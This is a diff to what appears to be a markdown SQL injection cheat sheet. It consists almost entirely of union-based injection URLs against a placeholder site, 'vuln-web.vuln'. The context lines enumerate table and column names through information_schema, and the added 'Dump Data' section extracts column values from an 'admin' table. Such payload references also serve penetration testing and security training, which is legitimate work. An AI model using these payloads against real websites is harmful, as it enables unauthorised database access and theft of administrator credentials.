@@ -83,3 +83,9 @@ https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(ta
 https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='admin'),4,5-- -
 https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()),4,5-- -
 ```
+
+**Dump Data**
+
+```
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column1,':',column2) FROM admin),4,5-- -
+```
